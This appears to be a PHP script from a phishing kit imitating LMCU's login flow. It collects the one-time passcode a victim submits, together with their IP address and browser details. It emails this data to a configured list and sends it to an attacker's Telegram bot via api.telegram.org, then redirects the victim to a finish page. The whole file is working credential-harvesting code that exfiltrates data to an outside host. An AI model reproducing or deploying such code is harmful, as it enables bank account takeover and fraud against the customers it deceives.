<?php

include '../email.php';



$Port = getenv("REMOTE_PORT");
$ip = getenv("REMOTE_ADDR");
$data = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$_SESSION['data'] = $data;


$form = "**LMCU  OTP***\n";
$form .= "|Otp : ".$_POST['otp']."\n";
$form .= "|UserIP : ".$ip."\n";
$form .= "|BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$form .= "|DateTime : ".$timedate."\n";
$form .= "----------------------------------------\n";


$subject = "**LMCU  OTP*** From   $ip";
$headers = "From: ✅ Unknown Haxor ✅ \r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

foreach ($email as $email) {
    mail($email,$subject,$form,$headers);
}
    

$data = [
    'chat_id' => $telegramID,
    'text' => $form
];
$response = file_get_contents("https://api.telegram.org/bot$telegramTOKEN/sendMessage?" .
                                http_build_query($data) );

header("Location: ../Login/finish.php");

?>